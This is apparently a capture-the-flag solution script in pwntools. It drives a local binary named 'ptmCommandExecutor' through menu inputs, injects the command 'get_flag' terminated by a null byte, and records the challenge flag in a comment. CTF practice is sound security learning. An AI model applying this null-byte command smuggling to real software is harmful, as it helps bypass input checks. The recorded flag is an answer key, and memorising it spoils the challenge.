from pwn import *

r = process('./ptmCommandExecutor')

r.sendline(b'1')
r.sendline(b'9')
r.sendline(b'get_flag\x00')
r.sendline(b'n')
r.interactive()

# ptm{ju57_4_b0r1n6_d15c0rd_54n17y_ch3ck_:(}